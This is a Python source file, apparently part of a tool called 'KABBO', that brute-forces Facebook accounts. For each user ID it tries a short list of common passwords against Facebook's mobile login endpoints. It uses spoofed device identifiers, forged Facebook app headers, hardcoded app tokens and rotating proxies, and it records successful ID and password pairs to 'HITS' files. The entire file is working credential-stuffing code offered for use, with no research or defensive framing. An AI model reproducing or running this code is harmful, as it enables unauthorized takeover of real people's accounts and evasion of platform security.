import sys
import time
import random
import requests
import config
from useragent import get_ua, is_fb_ua, is_mobile_ua
from uid import creationyear, fake_device_ids
from proxy import next_proxy
from config import inc_loop, add_ok

G   = '\x1b[38;5;46m'
Y   = '\x1b[38;5;220m'
CY  = '\x1b[38;5;51m'
W   = '\x1b[1;97m'
DIM = '\x1b[2;37m'
R   = '\x1b[38;5;196m'
RST = '\x1b[0m'


def _rand_hex(n):
    return ''.join(random.choices('0123456789abcdef', k=n))


def _rand_hni():
    return str(random.randint(20000, 40000))


def _rand_session_id():
    nid = _rand_hex(16)
    tid = random.randint(100, 999)
    return f"nid={nid};pid=Main;tid={tid};"


def _status_line(method):
    sys.stdout.write(
        f"\r  {DIM}❯ KABBO-M{method}{RST}  "
        f"Tried {CY}{config.loop}{RST}  {DIM}│{RST}  "
        f"Hits {G}{len(config.oks)}{RST}    "
    )
    sys.stdout.flush()


def _hit_line(method, uid, pw):
    year = creationyear(uid)
    year_str = f"  {DIM}│{RST}  {G}{year}{RST}" if year else ''
    sys.stdout.write(
        f"\r  {G}✔{RST}  {CY}KABBO-M{method}{RST}  "
        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}{year_str}\n"
    )
    sys.stdout.flush()


def _build_headers_1(ua):
    if is_fb_ua():
        return {
            'User-Agent':                   ua,
            'Content-Type':                 'application/x-www-form-urlencoded',
            'Host':                         'graph.facebook.com',
            'X-FB-Net-HNI':                 _rand_hni(),
            'X-FB-SIM-HNI':                 _rand_hni(),
            'X-FB-Connection-Type':         'MOBILE.LTE',
            'X-Tigon-Is-Retry':             'False',
            'x-fb-session-id':              _rand_session_id(),
            'x-fb-device-group':            str(random.randint(4000, 6000)),
            'X-FB-Friendly-Name':           'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags':  'graphservice',
            'X-FB-HTTP-Engine':             'Liger',
            'X-FB-Client-IP':               'True',
            'X-FB-Server-Cluster':          'True',
            'x-fb-connection-token':        _rand_hex(32),
        }
    elif is_mobile_ua():
        return {
            'User-Agent':    ua,
            'Content-Type':  'application/x-www-form-urlencoded',
            'Host':          'graph.facebook.com',
            'Accept':        'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection':    'keep-alive',
        }
    else:
        return {
            'User-Agent':    ua,
            'Content-Type':  'application/x-www-form-urlencoded',
            'Host':          'graph.facebook.com',
            'Accept':        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection':    'keep-alive',
        }


def _build_headers_2(ua):
    if is_fb_ua():
        return {
            'x-fb-connection-bandwidth': str(random.randint(20000000, 29999999)),
            'x-fb-sim-hni':              _rand_hni(),
            'x-fb-net-hni':              _rand_hni(),
            'x-fb-connection-quality':   'EXCELLENT',
            'x-fb-connection-type':      'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent':                ua,
            'content-type':              'application/x-www-form-urlencoded',
            'x-fb-http-engine':          'Liger',
            'x-fb-session-id':           _rand_session_id(),
            'x-fb-connection-token':     _rand_hex(32),
        }
    elif is_mobile_ua():
        return {
            'user-agent':    ua,
            'content-type':  'application/x-www-form-urlencoded',
            'accept':        'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'connection':    'keep-alive',
        }
    else:
        return {
            'user-agent':    ua,
            'content-type':  'application/x-www-form-urlencoded',
            'accept':        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'connection':    'keep-alive',
        }


def login_1(uid):
    session = requests.session()
    session.proxies = next_proxy() or {}
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            _status_line(1)
            ids  = fake_device_ids()
            ua   = get_ua()
            data = {
                'adid':                     ids['adid'],
                'format':                   'json',
                'device_id':                ids['device_id'],
                'cpl':                      'true',
                'family_device_id':         ids['family_device_id'],
                'credentials_type':         'device_based_login_password',
                'error_detail_type':        'button_with_disabled',
                'source':                   'device_based_login',
                'email':                    str(uid),
                'password':                 str(pw),
                'access_token':             '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta':          '',
                'advertiser_id':            ids['advertiser_id'],
                'currently_logged_in_userid': '0',
                'locale':                   'en_US',
                'client_country_code':      'US',
                'method':                   'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class':      'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key':                  '882a8490361da98702bf97a021ddc14d',
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=_build_headers_1(ua), allow_redirects=False
            ).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                _hit_line(1, uid, pw)
                open('/sdcard/KABBO-M1-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                add_ok(uid)
                break
        inc_loop()
    except Exception:
        time.sleep(5)


def login_2(uid):
    _proxy = next_proxy() or {}
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        _status_line(2)
        try:
            with requests.Session() as session:
                session.proxies = _proxy
                ua  = get_ua()
                url = (
                    f"https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=%20"
                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
                    f"&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = session.get(url, headers=_build_headers_2(ua)).json()
                if 'session_key' in str(po):
                    _hit_line(2, uid, pw)
                    open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                    add_ok(uid)
                    break
        except Exception:
            pass
    inc_loop()
